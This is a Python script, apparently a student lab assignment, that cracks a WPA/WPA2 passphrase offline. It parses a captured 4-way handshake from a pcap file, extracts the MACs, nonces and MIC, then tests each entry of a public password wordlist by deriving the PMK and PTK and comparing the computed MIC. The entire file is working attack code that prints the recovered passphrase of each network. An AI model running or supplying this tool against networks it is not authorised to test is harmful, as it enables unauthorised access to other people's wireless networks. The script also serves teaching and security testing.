#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Auteurs : Thomann Yanick, Galley David, Gachet Jean
Date : 03/05/2023

Liste de mots utilisée trouvée ici: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
Note: ajouté "actuelle" en 1500ème position.

Derive les clés WPA depuis un mot de passe et les infos d'un 4-way handshake

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""


from binascii import a2b_hex
from scapy.all import *
from pbkdf2 import *
from custom_tools import get_next_line_from_file, get_ssids_and_handshakes


def custom_prf512(key, a, b):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    b_len = 64
    i = 0
    r = b''
    while i <= ((b_len * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, a + str.encode(chr(0x00)) + b + str.encode(chr(i)), hashlib.sha1)
        i += 1
        r = r + hmacsha1.digest()
    return r[:b_len]


if __name__ == '__main__':

    # Read capture file -- it contains beacon, authentication, association, handshake and data
    wpa = rdpcap("wpa_handshake.cap")

    # Get all 4-way handshakes in the pcap
    ssids, handshakes = get_ssids_and_handshakes(wpa)

    for ssid in ssids:
        if ssid not in handshakes:
            break

        print("----- Start hacking of {} -----".format(ssid))
        handshake = handshakes[ssid]

        # getting AP and client MAC from message 1
        ap_mac = a2b_hex(handshake[0].addr2.replace(':', ''))
        client_mac = a2b_hex(handshake[0].addr1.replace(':', ''))

        # Authenticator and Supplicant Nonces
        key_data = handshake[0][EAPOL].load  # AP nonce is in the 1st message
        ap_nonce = a2b_hex(key_data[13:45].hex())
        key_data = handshake[1][EAPOL].load  # client nonce is in the 2nd message
        client_nonce = a2b_hex(key_data[13:45].hex())

        # This is the MIC contained in the 4th frame of the 4-way handshake
        key_data = handshake[3][EAPOL].load
        mic_to_test = key_data[-18:-2].hex()

        # Computing necessary values
        a = b"Pairwise key expansion"  # this string is used in the pseudo-random function
        b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(ap_nonce, client_nonce) + max(ap_nonce, client_nonce)

        dot11_version = b"\x01"  # 802.1X-2001
        dott11_type = b"\x03"  # key
        message4_len = b"\x00\x5f"  # 95 bytes
        payload = handshake[3][EAPOL].load
        payload = payload[0:-18] + b"\x00" * 16 + payload[-2:]  # putting MIC to 0
        data = a2b_hex(dot11_version.hex() + dott11_type.hex() + message4_len.hex() + payload.hex())

        passphrases_filename = "probable-v2-wpa-top4800.txt"
        passphrase_found = False
        for passphrase in get_next_line_from_file(passphrases_filename):
            # derives the PMK and then the PTK
            pmk = pbkdf2(hashlib.sha1, str.encode(passphrase), str.encode(ssid), 4096, 32)
            ptk = custom_prf512(pmk, a, b)

            # PTK = KCK|KEK|TK|MICK
            kck = ptk[0:16]

            # calculate MIC over EAPOL payload (Michael)
            # as seen with the assistant, the output of hmac here is too large, taking only the first 32 bytes
            mic = hmac.new(kck, data, hashlib.sha1).hexdigest()[0:32]
            if mic == mic_to_test:
                passphrase_found = True
                print("The passphrase for \"{}\" is: {}".format(ssid, passphrase))
                break

        if not passphrase_found:
            print("The passphrase for \"{}\" was not found in the file.".format(ssid))
